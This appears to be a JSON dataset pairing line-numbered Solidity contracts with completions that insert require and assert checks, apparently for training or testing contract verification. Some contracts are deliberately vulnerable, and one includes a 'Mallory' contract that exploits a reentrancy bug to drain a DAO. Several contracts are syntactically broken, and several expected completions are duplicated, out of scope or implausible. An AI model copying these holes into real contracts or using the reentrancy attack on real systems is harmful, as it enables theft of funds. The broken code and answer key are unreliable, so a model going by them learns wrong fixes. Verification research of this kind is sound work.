     return true;\n117     }\n118 }\n\n119 contract MultiTransferToken is StandardToken, Ownable {\n\n120     function MultiTransfer(address[] _to, uint256[] _amount) onlyOwner public returns (bool) {\n        \n121         uint256 ui;\n122         uint256 amountSum = 0;\n    \n123         for (ui = 0; ui < _to.length; ui++) {          \n\n124             amountSum = amountSum.add(_amount[ui]);\n125         }       \n\n126         for (ui = 0; ui < _to.length; ui++) {\n127             balances[msg.sender] = balances[msg.sender].sub(_amount[ui]);\n128             balances[_to[ui]] = balances[_to[ui]].add(_amount[ui]);\n        \n129             emit Transfer(msg.sender, _to[ui], _amount[ui]);\n130         }\n    \n131         return true;\n132     }\n133 }\n\n134 contract BurnableToken is StandardToken, Ownable {\n\n135     event BurnAdminAmount(address indexed burner, uint256 value);\n\n136     function burnAdminAmount(uint256 _value) onlyOwner public {      \n\n137         balances[msg.sender] = balances[msg.sender].sub(_value);\n138         totalSupply_ = totalSupply_.sub(_value);\n    \n139         emit BurnAdminAmount(msg.sender, _value);\n140         emit Transfer(msg.sender, address(0), _value);\n141     }\n142 }\n\n143 contract MintableToken is StandardToken, Ownable {\n144     event Mint(address indexed to, uint256 amount);\n145     event MintFinished();\n\n146     bool public mintingFinished = false;\n\n147     modifier canMint() { require(!mintingFinished); _; }\n\n148     function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n149         totalSupply_ = totalSupply_.add(_amount);\n150         balances[_to] = balances[_to].add(_amount);\n    \n151         emit Mint(_to, _amount);\n152         emit Transfer(address(0), _to, _amount);\n    \n153         return true;\n154     }\n\n155     function finishMinting() onlyOwner canMint public returns (bool) {\n156         mintingFinished = true;\n157         emit MintFinished();\n158         return true;\n159     }\n160 }\n\n161 contract PausableToken is StandardToken, Pausable, BlackList {\n\n162     function transfer(address _to, uint256 _value) public whenNotPaused CheckBlackList returns (bool) {\n163         return super.transfer(_to, _value);\n164     }\n\n165     function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused CheckBlackList returns (bool) {      \n\n166         return super.transferFrom(_from, _to, _value);\n167     }\n\n168     function approve(address _spender, uint256 _value) public whenNotPaused CheckBlackList returns (bool) {\n169         return super.approve(_spender, _value);\n170     }\n\n171     function increaseApproval(address _spender, uint _addedValue) public whenNotPaused CheckBlackList returns (bool success) {\n172         return super.increaseApproval(_spender, _addedValue);\n173     }\n\n174     function decreaseApproval(address _spender, uint _subtractedValue) public whenNotPaused CheckBlackList returns (bool success) {\n175         return super.decreaseApproval(_spender, _subtractedValue);\n176     }\n177 }",
        "completion": "21+ require(_to != address(0));\n21+ require(_value <= balances[msg.sender]);\n40+  require(msg.sender == owner);\n42+  require(msg.sender == owner || msg.sender == operator); \n44+ require(_newOwner != address(0));\n48+  require(_newOperator != address(0));\n57+ require(blackList[msg.sender] != true);\n59+  require(_lockAddress != address(0));\n59+  require(_lockAddress != owner);\n59+ require(blackList[_lockAddress] != true);\n64+ require(blackList[_unlockAddress] != false);\n87+ require(_to != address(0));\n87+ require(_value <= balances[_from]);\n87+  require(_value <= allowed[_from][msg.sender]);\n120+ require(_to.length == _amount.length);\n123+ require(_to[ui] != address(0));\n125+ require(amountSum <= balances[msg.sender]);\n136+  require(_value <= balances[msg.sender]);\n165+  require(blackList[_from] != true);\n165+   require(blackList[_to] != true);\n"
    },
    {
        "prompt": "",
        "completion": ""
    },
    {
        "prompt": "1 // SPDX-License-Identifier: MIT\n2 pragma solidity ^0.6.8;\n3 pragma experimental ABIEncoderV2;\n\n4 import \"./openzeppelin/contracts/access/Ownable.sol\";\n5 import \"./umb-network/toolbox/dist/contracts/lib/ValueDecoder.sol\";\n6 import \"./interfaces/IStakingBank.sol\";\n7 import \"./BaseChain.sol\";\n\n8 contract Chain is BaseChain {\n9   IStakingBank public immutable stakingBank;\n10   event LogMint(address indexed minter, uint256 blockId, uint256 staked, uint256 power);\n11   event LogVoter(uint256 indexed blockId, address indexed voter, uint256 vote);\n\n\n12   constructor(\n13     address _contractRegistry,\n14     uint16 _padding,\n15     uint16 _requiredSignatures\n16   ) public BaseChain(_contractRegistry, _padding, _requiredSignatures) {\n17     stakingBank = stakingBankContract();\n18   }\n\n\n\n19   function isForeign() override external pure returns (bool) {\n20     return false;\n21   }\n\n22   function getName() override external pure returns (bytes32) {\n23     return \"Chain\";\n24   }\n\n25   function getStatus() external view returns(\n26     uint256 blockNumber,\n27     uint16 timePadding,\n28     uint32 lastDataTimestamp,\n29     uint32 lastBlockId,\n30     address nextLeader,\n31     uint32 nextBlockId,\n32     address[] memory validators,\n33     uint256[] memory powers,\n34     string[] memory locations,\n35     uint256 staked,\n36     uint16 minSignatures\n37   ) {\n38     blockNumber = block.number;\n39     timePadding = padding;\n40     lastBlockId = getLatestBlockId();\n41     lastDataTimestamp = squashedRoots[lastBlockId].extractTimestamp();\n42     minSignatures = requiredSignatures;\n\n43     staked = stakingBank.totalSupply();\n44     uint256 numberOfValidators = stakingBank.getNumberOfValidators();\n45     powers = new uint256[](numberOfValidators);\n46     validators = new address[](numberOfValidators);\n47     locations = new string[](numberOfValidators);\n\n48     for (uint256 i = 0; i < numberOfValidators; i++) {\n49       validators[i] = stakingBank.addresses(i);\n50       (, locations[i]) = stakingBank.validators(validators[i]);\n51       powers[i] = stakingBank.balanceOf(validators[i]);\n52     }\n\n53     nextBlockId = getBlockIdAtTimestamp(block.timestamp + 1);\n\n54     nextLeader = numberOfValidators > 0\n55       ? validators[getLeaderIndex(numberOfValidators, block.timestamp + 1)]\n56       : address(0);\n57   }\n\n58   function getNextLeaderAddress() external view returns (address) {\n59     return getLeaderAddressAtTime(block.timestamp + 1);\n60   }\n\n61   function getLeaderAddress() external view returns (address) {\n62     return getLeaderAddressAtTime(block.timestamp);\n63   }\n \n64   function submit(\n65     uint32 _dataTimestamp,\n66     bytes32 _root,\n67     bytes32[] memory _keys,\n68     uint256[] memory _values,\n69     uint8[] memory _v,\n70     bytes32[] memory _r,\n71     bytes32[] memory _s\n72   ) public { \n73     uint32 lastBlockId = getLatestBlockId();\n74     uint32 dataTimestamp = squashedRoots[lastBlockId].extractTimestamp();\n    \n75     bytes memory testimony = abi.encodePacked(_dataTimestamp, _root);\n\n76     for (uint256 i = 0; i < _keys.length; i++) {\n77       require(uint224(_values[i]) == _values[i], \"FCD overflow\");\n78       fcds[_keys[i]] = FirstClassData(uint224(_values[i]), _dataTimestamp);\n79       testimony = abi.encodePacked(testimony, _keys[i], _values[i]);\n80     }\n\n81     bytes32 affidavit = keccak256(testimony);\n82     uint256 power = 0;\n\n83     uint256 staked = stakingBank.totalSupply();\n84     address prevSigner = address(0x0);\n\n85     uint256 i = 0;\n\n86     for (; i < _v.length; i++) {\n87       address signer = recoverSigner(affidavit, _v[i], _r[i], _s[i]);\n88       uint256 balance = stakingBank.balanceOf(signer);\n\n89       require(prevSigner < signer, \"validator included more than once\");\n90       prevSigner = signer;\n91       if (balance == 0) continue;\n\n92       emit LogVoter(lastBlockId + 1, signer, balance);\n93       power += balance; // no need for safe math, if we overflow then we will not have enough power\n94     }\n\n95     require(i >= requiredSignatures, \"not enough signatures\");\n96     squashedRoots[lastBlockId + 1] = _root.makeSquashedRoot(_dataTimestamp);\n97     blocksCount++;\n\n98     emit LogMint(msg.sender, lastBlockId + 1, staked, power);\n99   }\n\n100   function getLeaderIndex(uint256 _numberOfValidators, uint256 _timestamp) public view returns (uint256) {\n101     uint32 latestBlockId = getLatestBlockId();\n102     uint256 validatorIndex = latestBlockId +\n103       (_timestamp - squashedRoots[latestBlockId].extractTimestamp()) / (padding + 1);\n\n104     return uint16(validatorIndex % _numberOfValidators);\n105   }\n\n106   function getLeaderAddressAtTime(uint256 _timestamp) public view returns (address) {\n107     uint256 numberOfValidators = stakingBank.getNumberOfValidators();\n108     if (numberOfValidators == 0) {\n109       return address(0x0);\n110     }\n111     uint256 validatorIndex = getLeaderIndex(numberOfValidators, _timestamp);\n112     return stakingBank.addresses(validatorIndex);\n113   }\n114 }\n",
        "completion": "74+ require(msg.sender == owner, \"only owner\");\n74+ require(dataTimestamp + padding < block.timestamp, \"do not spam\");\n74+ require(dataTimestamp < _dataTimestamp, \"can NOT submit older data\");\n74+ require(_keys.length == _values.length, \"numbers of keys and values not the same\");\n76+  require(uint224(_values[i]) == _values[i], \"FCD overflow\");\n94+ require(i >= requiredSignatures, \"not enough signatures\");"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: MIT\n2 pragma solidity >=0.4.24 <0.6.0;\n\n3 contract Lottery {\n\n4         mapping (address => mapping(uint64 => uint))\n5         public tickets;\n6         uint64 winningId; \n7         bool drawingPhase; \n8         }\n9         function reset() external{\n10                 delete tickets;\n11                 winningId = 0; drawingPhase = false;\n12         }\n13         function buy(uint64 id, uint amount) external {        \n14                receivePayment(msg.sender, amount);\n15                tickets[msg.sender][id] += amount;\n16         }\n17         function enterDrawingPhase() external {\n18                 drawingPhase = true;\n19         }\n\n20         function draw(uint64 id) external {\n21                 require(winningId == 0, \"already drawn\");              \n22                 require(id != 0, \"invalid winning number\");\n23                 winningId = id;\n24         }\n25         function claimReward() external {\n26                 require(winningId != 0, \"not drawn\");\n      \n27         }\n28         function multiBuy(uint[] ids, uint[] amounts)\n29         external {\n               \n30                 uint totalAmount = 0;\n31                 for (int i = 0; i < ids.length; i++) {\n32                 tickets[msg.sender][ids[i]] += amounts[i];\n33                 totalAmount += amounts[i];\n34         }\n35              receivePayment(msg.sender, totalAmount);\n36         }\n37  }",
        "completion": "13+ require(winningId == 0, \"already drawn\");\n13+ require(!drawingPhase, \"drawing\");\n20+  require(drawingPhase, \"not drawing\");\n29+  require(winningId == 0, \"already drawn\");\n29+ require(!drawingPhase, \"drawing\");"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: MIT\n2 pragma solidity >=0.4.24 <0.6.0;\n\n3 contract Lottery {\n\n4         mapping (address => mapping(uint64 => uint))\n5         public tickets;\n6         uint64 winningId; \n7         bool drawingPhase; \n8         }\n    \n9         function enterDrawingPhase() external {\n10                 drawingPhase = true;\n11         }\n\n12         function draw(uint64 id) external {\n13                 require(winningId == 0, \"already drawn\");\n14                 require(id != 0, \"invalid winning number\");\n15                 winningId = id;\n16         }\n17         function multiBuy(uint[] ids, uint[] amounts)\n18         external {\n19                 require(winningId == 0, \"already drawn\");             \n20                 uint totalAmount = 0;\n21                 for (int i = 0; i < ids.length; i++) {\n22                 tickets[msg.sender][ids[i]] += amounts[i];\n23                 totalAmount += amounts[i];\n24         }\n25              receivePayment(msg.sender, totalAmount);\n26         }\n27  }",
        "completion": "19+   require(!drawingPhase, \"drawing\");"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24<0.6.0;\n2 \n3 contract SimpleDAO {\n4     mapping (address => uint) public credit;\n5     constructor() public {\n6     }\n7     function donate(address to, uint amount) payable public {\n8         credit[to] += amount;\n9     }\n10     function queryCredit(address to) public view returns (uint) {\n11         return credit[to];\n12     }\n13     function withdraw() public {\n14         uint oldBal = address(this).balance; \n15         address payable sender = msg.sender;\n16         uint balSender = msg.sender.balance; // translated OK\n17         uint amount = credit[msg.sender];\n18         if (amount > 0) {\n19             sender.transfer(amount); // VeriSol bug #185 (can't handle msg.sender.transfer)\n20             credit[msg.sender] = 0;  // BUG: \n21         }\n22         uint bal = address(this).balance;       \n23     }\n24 }\n25 \n26 contract Mallory {\n27     SimpleDAO public dao;\n28     uint count;\n29     constructor (address daoAddr) public payable {\n30         count = 0;\n31         dao = SimpleDAO(daoAddr);\n32         require(dao.queryCredit(address(this)) == 0);\n33         require(address(this).balance == 1);\n34     }\n35     function () payable external {\n36         if (count < 2) {\n37             count ++;\n38             dao.withdraw();\n39         }\n40     }\n41     function donate() public {        \n42         dao.donate(address(this), address(this).balance);  //should this not be a send(this.balance)? \n43     }\n44     function getJackpot() public {\n45         dao.withdraw();\n46     }\n47 }  ",
        "completion": "22+ assert(bal == oldBal || bal == (oldBal - amount));"
    },
    {
        "prompt": "1 ragma solidity ^0.5.0;\n2 \n3 import \"./IERC20.sol\";\n4 import \"./SafeMath.sol\";\n5 import \"./Libraries/VeriSolContracts.sol\"; //change \n6 \n7 \n8 contract ERC20 is IERC20 {\n9 \n10     mapping (address => uint256) private _balances;\n11     uint256 private _totalSupply;\n12 \n13     constructor (uint256 totalSupply) public {\n14        require(msg.sender != address(0));\n15        _totalSupply = totalSupply;\n16        _balances[msg.sender] = totalSupply;\n17     }\n18 \n19 \n20     function totalSupply() public view returns (uint256) {\n21         return _totalSupply;\n22     }\n23 \n24     function balanceOf(address account) public view returns (uint256) {\n25         return _balances[account];\n26     }\n27 \n28     function transfer(address recipient, uint256 amount) public returns (bool) {\n29         uint oldBalanceSender = _balances[msg.sender];\n30 \n31         _transfer(msg.sender, recipient, amount);       \n32         return true;\n33     }\n34 \n35   \n36     function _transfer(address sender, address recipient, uint256 amount) internal {\n37         require(sender != address(0), \"ERC20: transfer from the zero address\");\n38         require(recipient != address(0), \"ERC20: transfer to the zero address\");\n39         require(_balances[sender] >= amount);\n40 \n41         _balances[sender] = SafeMath.sub(_balances[sender], amount);\n42                         \n43                 _balances[recipient] = _balances[recipient] + amount; // nosafemath //_balances[recipient] = _balances[recipient].add(amount);\n44     }\n45 }",
        "completion": "31+   assert (msg.sender == recipient || _balances[recipient] >= VeriSol.Old(_balances[recipient]));"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n2 \n3 contract AssertFalse {\n4 \n5     function test1() public {\n6               _;\n7 \n8     }\n9 \n10     function test2() public {\n11         assert (!(1 > 2));\n12     }\n13 ",
        "completion": "6+ assert (!false);\n"
    },
    {
        "prompt": "1  // SPDX-License-Identifier: MIT\n2  pragma solidity >=0.4.24 <0.6.0;\n3  \n4  contract overflow{\n5     function transferProxy (address from, address to, uint\n6     value, uint fee) {  \n7         if (balance[from] < fee + value) revert();\n8 \n9         if (balance[to] + value < balance[to] ||\n10         balance[msg.sender] + fee < balance[msg.sender])\n11         revert();\n12 \n13         balance[to] += value;\n14         balance[msg.sender] += fee;\n15         balance[from] -= value + fee;\n16     }",
        "completion": "6+  assert(fee + value != 0);\n"
    },
    {
        "prompt": "1  // SPDX-License-Identifier: MIT\n2  pragma solidity >=0.4.24 <0.6.0;\n3  \n4  contract testSuicide{\n5         function initMultiowned(address[] _owners,\n6                             uint _required){\n7         if (m_numOwners > 0) throw;\n8         m_numOwners = _owners.length + 1;\n9         m_owners[1] = uint(msg.sender);\n10         m_ownerIndex[uint(msg.sender)] = 1;\n11         m_required = _required;\n12 \n13         }\n14 \n15         function kill(address _to) {\n16             uint ownerIndex = m_ownerIndex[uint(msg.sender)];\n17             if (ownerIndex == 0) return;\n18             var pending = m_pending[sha3(msg.data)];\n19             if (pending.yetNeeded == 0) {\n20             pending.yetNeeded = m_required;\n21             pending.ownersDone = 0;\n22             }\n23             uint ownerIndexBit = 2**ownerIndex;\n24             if (pending.ownersDone   ownerIndexBit == 0) {\n25             if (pending.yetNeeded <= 1)\n26                 suicide(_to);\n27             else {\n28                 pending.yetNeeded--;\n29                 pending.ownersDone |= ownerIndexBit;\n30             }\n31             }\n32         }\n33  }",
        "completion": "15+ assert(_required > 0); \n15+  assert(m_numOwners > 0);"
    },
    {
        "prompt": "1 / SPDX-License-Identifier: MIT\n2  pragma solidity >=0.4.24 <0.6.0;\n3  \n4  contract ether{\n5         function payout(address[] recipients,\n6                         uint256[] amounts) {\n7         require(recipients.length==amounts.length);\n8         for (uint i = 0; i < recipients.length; i++) {\n9         recipients[i].send(amounts[i]);\n10         }\n11         }\n12  }",
        "completion": "6+  assert(address(this)==msg.sender);\n"
    },
    {
        "prompt": "1   // SPDX-License-Identifier: MIT\n2 pragma solidity ^0.6.8;\n3 pragma experimental ABIEncoderV2;\n4 \n5 \n6 contract Chain  {\n7   IStakingBank public immutable stakingBank;\n8 \n9   event LogMint(address indexed minter, uint256 blockId, uint256 staked, uint256 power);\n10   event LogVoter(uint256 indexed blockId, address indexed voter, uint256 vote);\n11 \n12   IStakingBank public immutable stakingBank;\n13 \n14   constructor(\n15     address _contractRegistry,\n16     uint16 _padding,\n17     uint16 _requiredSignatures\n18   ) public BaseChain(_contractRegistry, _padding, _requiredSignatures) {\n19     stakingBank = stakingBankContract();\n20   }\n21 \n22   function submit(\n23     uint32 _dataTimestamp,\n24     bytes32 _root,\n25     bytes32[] memory _keys,\n26     uint256[] memory _values,\n27     uint8[] memory _v,\n28     bytes32[] memory _r,\n29     bytes32[] memory _s\n30   ) public {  \n31     uint32 lastBlockId = getLatestBlockId();\n32     uint32 dataTimestamp = squashedRoots[lastBlockId].extractTimestamp();\n33 \n34 \n35     require(_keys.length == _values.length, \"numbers of keys and values not the same\");\n36 \n37     bytes memory testimony = abi.encodePacked(_dataTimestamp, _root);\n38 \n39     for (uint256 i = 0; i < _keys.length; i++) {\n40       require(uint224(_values[i]) == _values[i], \"FCD overflow\");\n41       fcds[_keys[i]] = FirstClassData(uint224(_values[i]), _dataTimestamp);\n42       testimony = abi.encodePacked(testimony, _keys[i], _values[i]);\n43     }\n44 \n45     bytes32 affidavit = keccak256(testimony);\n46     uint256 power = 0;\n47 \n48     uint256 staked = stakingBank.totalSupply();\n49     address prevSigner = address(0x0);\n50 \n51     uint256 i = 0;\n52 \n53     for (; i < _v.length; i++) {\n54       address signer = recoverSigner(affidavit, _v[i], _r[i], _s[i]);\n55       uint256 balance = stakingBank.balanceOf(signer);\n56 \n57       require(prevSigner < signer, \"validator included more than once\");\n58       prevSigner = signer;\n59       if (balance == 0) continue;\n60 \n61       emit LogVoter(lastBlockId + 1, signer, balance);\n62       power += balance; \n63     }\n64 \n65     require(i >= requiredSignatures, \"not enough signatures\");\n66 \n67     squashedRoots[lastBlockId + 1] = _root.makeSquashedRoot(_dataTimestamp);\n68     blocksCount++;\n69 \n70     emit LogMint(msg.sender, lastBlockId + 1, staked, power);\n71   }\n72 \n73   function getLeaderIndex(uint256 _numberOfValidators, uint256 _timestamp) public view returns (uint256) {\n74     uint32 latestBlockId = getLatestBlockId();\n75 \n76     \n77     uint256 validatorIndex = latestBlockId +\n78       (_timestamp - squashedRoots[latestBlockId].extractTimestamp()) / (padding + 1);\n79 \n80     return uint16(validatorIndex % _numberOfValidators);\n81   }\n82 \n83   function getLeaderAddressAtTime(uint256 _timestamp) public view returns (address) {\n84     uint256 numberOfValidators = stakingBank.getNumberOfValidators();\n85 \n86     if (numberOfValidators == 0) {\n87       return address(0x0);\n88     }\n89 \n90     uint256 validatorIndex = getLeaderIndex(numberOfValidators, _timestamp);\n91 \n92     return stakingBank.addresses(validatorIndex);\n93   }\n94 }",
        "completion": "30+ assert(msg.sender == _contractRegistry);\n30+ assert(msg.sender == _contractRegistry);"
    },
    {
        "prompt": "1 //SPDX-License-Identifier: GPL-3.0\n2 pragma solidity 0.8.4;\n3 \n4 import \"../libraries/MathLib.sol\";\n5 import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n6 import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n7 import \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n8 import \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n9 import \"../interfaces/IExchangeFactory.sol\";\n10 \n11 \n12 contract Exchange is ERC20, ReentrancyGuard {\n13     using MathLib for uint256;\n14     using SafeERC20 for IERC20;\n15 \n16     address public immutable baseToken; // address of ERC20 base token (elastic or fixed supply)\n17     address public immutable quoteToken; // address of ERC20 quote token (WETH or a stable coin w/ fixed supply)\n18     address public immutable exchangeFactoryAddress;\n19 \n20     uint256 public constant TOTAL_LIQUIDITY_FEE = 30; // fee provided to liquidity providers + DAO in basis points\n21 \n22     MathLib.InternalBalances public internalBalances =\n23         MathLib.InternalBalances(0, 0, 0);\n24 \n25     event AddLiquidity(\n26         address indexed liquidityProvider,\n27         uint256 baseTokenQtyAdded,\n28         uint256 quoteTokenQtyAdded\n29     );\n30     event RemoveLiquidity(\n31         address indexed liquidityProvider,\n32         uint256 baseTokenQtyRemoved,\n33         uint256 quoteTokenQtyRemoved\n34     );\n35     event Swap(\n36         address indexed sender,\n37         uint256 baseTokenQtyIn,\n38         uint256 quoteTokenQtyIn,\n39         uint256 baseTokenQtyOut,\n40         uint256 quoteTokenQtyOut\n41     );\n42 \n43 \n44     function isNotExpired(uint256 _expirationTimeStamp) internal view {\n45         require(_expirationTimeStamp >= block.timestamp, \"Exchange: EXPIRED\");\n46     }\n47 \n48   \n49     constructor(\n50         string memory _name,\n51         string memory _symbol,\n52         address _baseToken,\n53         address _quoteToken,\n54         address _exchangeFactoryAddress\n55     ) ERC20(_name, _symbol) {\n56         baseToken = _baseToken;\n57         quoteToken = _quoteToken;\n58         exchangeFactoryAddress = _exchangeFactoryAddress;\n59     }\n60 \n61 \n62     function addLiquidity(\n63         uint256 _baseTokenQtyDesired,\n64         uint256 _quoteTokenQtyDesired,\n65         uint256 _baseTokenQtyMin,\n66         uint256 _quoteTokenQtyMin,\n67         address _liquidityTokenRecipient,\n68         uint256 _expirationTimestamp\n69     ) external nonReentrant() {\n70         isNotExpired(_expirationTimestamp);\n71 \n72         MathLib.TokenQtys memory tokenQtys =\n73             MathLib.calculateAddLiquidityQuantities(\n74                 _baseTokenQtyDesired,\n75                 _quoteTokenQtyDesired,\n76                 _baseTokenQtyMin,\n77                 _quoteTokenQtyMin,\n78                 IERC20(baseToken).balanceOf(address(this)),\n79                 IERC20(quoteToken).balanceOf(address(this)),\n80                 this.totalSupply(),\n81                 internalBalances\n82             );\n83         //here is the buggy line \n84         internalBalances.kLast =\n85             internalBalances.baseTokenReserveQty /\n86             internalBalances.quoteTokenReserveQty;\n87 \n88         if (tokenQtys.liquidityTokenFeeQty > 0) {\n89             // mint liquidity tokens to fee address for k growth.\n90             _mint(\n91                 IExchangeFactory(exchangeFactoryAddress).feeAddress(),\n92                 tokenQtys.liquidityTokenFeeQty\n93             );\n94         }\n95         _mint(_liquidityTokenRecipient, tokenQtys.liquidityTokenQty); // mint liquidity tokens to recipient\n96 \n97         if (tokenQtys.baseTokenQty != 0) {\n98             bool isExchangeEmpty =\n99                 IERC20(baseToken).balanceOf(address(this)) == 0;\n100 \n101             // transfer base tokens to Exchange\n102             IERC20(baseToken).safeTransferFrom(\n103                 msg.sender,\n104                 address(this),\n105                 tokenQtys.baseTokenQty\n106             );\n107 \n108             if (isExchangeEmpty) {\n109                 require(\n110                     IERC20(baseToken).balanceOf(address(this)) ==\n111                         tokenQtys.baseTokenQty,\n112                     \"Exchange: FEE_ON_TRANSFER_NOT_SUPPORTED\"\n113                 );\n114             }\n115         }\n116 \n117         if (tokenQtys.quoteTokenQty != 0) {\n118             // transfer quote tokens to Exchange\n119             IERC20(quoteToken).safeTransferFrom(\n120                 msg.sender,\n121                 address(this),\n122                 tokenQtys.quoteTokenQty\n123             );\n124         }\n125 \n126         emit AddLiquidity(\n127             msg.sender,\n128             tokenQtys.baseTokenQty,\n129             tokenQtys.quoteTokenQty\n130         );\n131     }\n132 \n133    \n134     function removeLiquidity(\n135         uint256 _liquidityTokenQty,\n136         uint256 _baseTokenQtyMin,\n137         uint256 _quoteTokenQtyMin,\n138         address _tokenRecipient,\n139         uint256 _expirationTimestamp\n140     ) external nonReentrant() {\n141         isNotExpired(_expirationTimestamp);\n142         require(this.totalSupply() > 0, \"Exchange: INSUFFICIENT_LIQUIDITY\");\n143         require(\n144             _baseTokenQtyMin > 0 && _quoteTokenQtyMin > 0,\n145             \"Exchange: MINS_MUST_BE_GREATER_THAN_ZERO\"\n146         );\n147 \n148     \n149         uint256 baseTokenReserveQty =\n150             IERC20(baseToken).balanceOf(address(this));\n151         uint256 quoteTokenReserveQty =\n152             IERC20(quoteToken).balanceOf(address(this));\n153 \n154         uint256 totalSupplyOfLiquidityTokens = this.totalSupply();\n155         // calculate any DAO fees here.\n156         uint256 liquidityTokenFeeQty =\n157             MathLib.calculateLiquidityTokenFees(\n158                 totalSupplyOfLiquidityTokens,\n159                 internalBalances\n160             );\n161 \n162         totalSupplyOfLiquidityTokens += liquidityTokenFeeQty;\n163 \n164         uint256 baseTokenQtyToReturn =\n165             (_liquidityTokenQty * baseTokenReserveQty) /\n166                 totalSupplyOfLiquidityTokens;\n167         uint256 quoteTokenQtyToReturn =\n168             (_liquidityTokenQty * quoteTokenReserveQty) /\n169                 totalSupplyOfLiquidityTokens;\n170 \n171         require(\n172             baseTokenQtyToReturn >= _baseTokenQtyMin,\n173             \"Exchange: INSUFFICIENT_BASE_QTY\"\n174         );\n175 \n176         require(\n177             quoteTokenQtyToReturn >= _quoteTokenQtyMin,\n178             \"Exchange: INSUFFICIENT_QUOTE_QTY\"\n179         );\n180 \n181         uint256 baseTokenQtyToRemoveFromInternalAccounting =\n182             (_liquidityTokenQty * internalBalances.baseTokenReserveQty) /\n183                 totalSupplyOfLiquidityTokens;\n184 \n185         internalBalances\n186             .baseTokenReserveQty -= baseTokenQtyToRemoveFromInternalAccounting;\n187 \n188 \n189         if (quoteTokenQtyToReturn > internalBalances.quoteTokenReserveQty) {\n190             internalBalances.quoteTokenReserveQty = 0;\n191         } else {\n192             internalBalances.quoteTokenReserveQty -= quoteTokenQtyToReturn;\n193         }\n194 \n195         internalBalances.kLast =\n196             internalBalances.baseTokenReserveQty *\n197             internalBalances.quoteTokenReserveQty;\n198 \n199         if (liquidityTokenFeeQty > 0) {\n200             _mint(\n201                 IExchangeFactory(exchangeFactoryAddress).feeAddress(),\n202                 liquidityTokenFeeQty\n203             );\n204         }\n205 \n206         _burn(msg.sender, _liquidityTokenQty);\n207         IERC20(baseToken).safeTransfer(_tokenRecipient, baseTokenQtyToReturn);\n208         IERC20(quoteToken).safeTransfer(_tokenRecipient, quoteTokenQtyToReturn);\n209         emit RemoveLiquidity(\n210             msg.sender,\n211             baseTokenQtyToReturn,\n212             quoteTokenQtyToReturn\n213         );\n214     }\n215 \n216     function swapBaseTokenForQuoteToken(\n217         uint256 _baseTokenQty,\n218         uint256 _minQuoteTokenQty,\n219         uint256 _expirationTimestamp\n220     ) external nonReentrant() {\n221         isNotExpired(_expirationTimestamp);\n222         require(\n223             _baseTokenQty > 0 && _minQuoteTokenQty > 0,\n224             \"Exchange: INSUFFICIENT_TOKEN_QTY\"\n225         );\n226 \n227         uint256 quoteTokenQty =\n228             MathLib.calculateQuoteTokenQty(\n229                 _baseTokenQty,\n230                 _minQuoteTokenQty,\n231                 TOTAL_LIQUIDITY_FEE,\n232                 internalBalances\n233             );\n234 \n235         IERC20(baseToken).safeTransferFrom(\n236             msg.sender,\n237             address(this),\n238             _baseTokenQty\n239         );\n240 \n241         IERC20(quoteToken).safeTransfer(msg.sender, quoteTokenQty);\n242         emit Swap(msg.sender, _baseTokenQty, 0, 0, quoteTokenQty);\n243     }\n244 \n245 \n246     function swapQuoteTokenForBaseToken(\n247         uint256 _quoteTokenQty,\n248         uint256 _minBaseTokenQty,\n249         uint256 _expirationTimestamp\n250     ) external nonReentrant() {\n251         isNotExpired(_expirationTimestamp);\n252         require(\n253             _quoteTokenQty > 0 && _minBaseTokenQty > 0,\n254             \"Exchange: INSUFFICIENT_TOKEN_QTY\"\n255         );\n256 \n257         uint256 baseTokenQty =\n258             MathLib.calculateBaseTokenQty(\n259                 _quoteTokenQty,\n260                 _minBaseTokenQty,\n261                 IERC20(baseToken).balanceOf(address(this)),\n262                 TOTAL_LIQUIDITY_FEE,\n263                 internalBalances\n264             );\n265 \n266         IERC20(quoteToken).safeTransferFrom(\n267             msg.sender,\n268             address(this),\n269             _quoteTokenQty\n270         );\n271 \n272         IERC20(baseToken).safeTransfer(msg.sender, baseTokenQty);\n273         emit Swap(msg.sender, 0, _quoteTokenQty, baseTokenQty, 0);\n274     }\n275 }",
        "completion": "147+ assert(Old(internalBalances.baseTokenReserveQty) == internalBalances.baseTokenReserveQty);\n194+ assert(Old(internalBalances.baseTokenReserveQty) == internalBalances.baseTokenReserveQty);\n"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: MIT\n2 pragma solidity >=0.5.0;\n\n3 interface IERC20 {\n4     event Approval(address indexed owner, address indexed spender, uint value);\n5     event Transfer(address indexed from, address indexed to, uint value);\n\n6     function name() external view returns (string memory);\n7     function symbol() external view returns (string memory);\n8     function decimals() external view returns (uint8);\n9     function totalSupply() external view returns (uint);\n10     function balanceOf(address owner) external view returns (uint);\n11     function allowance(address owner, address spender) external view returns (uint);\n\n12     function approve(address spender, uint value) external returns (bool);\n13     function transfer(address to, uint value) external returns (bool);\n14     function transferFrom(address from, address to, uint value) external returns (bool);\n15 }\n\n16 interface IUniswapV2Pair {\n17     event Approval(address indexed owner, address indexed spender, uint value);\n18     event Transfer(address indexed from, address indexed to, uint value);\n\n19     function name() external pure returns (string memory);\n20     function symbol() external pure returns (string memory);\n21     function decimals() external pure returns (uint8);\n22     function totalSupply() external view returns (uint);\n23     function balanceOf(address owner) external view returns (uint);\n24     function allowance(address owner, address spender) external view returns (uint);\n\n25     function approve(address spender, uint value) external returns (bool);\n26     function transfer(address to, uint value) external returns (bool);\n27     function transferFrom(address from, address to, uint value) external returns (bool);\n\n28     function DOMAIN_SEPARATOR() external view returns (bytes32);\n29     function PERMIT_TYPEHASH() external pure returns (bytes32);\n30     function nonces(address owner) external view returns (uint);\n\n31     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\n\n32     event Mint(address indexed sender, uint amount0, uint amount1);\n33     event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n34     event Swap(\n35         address indexed sender,\n36         uint amount0In,\n37         uint amount1In,\n38         uint amount0Out,\n39         uint amount1Out,\n40         address indexed to\n41     );\n42     event Sync(uint112 reserve0, uint112 reserve1);\n\n43     function 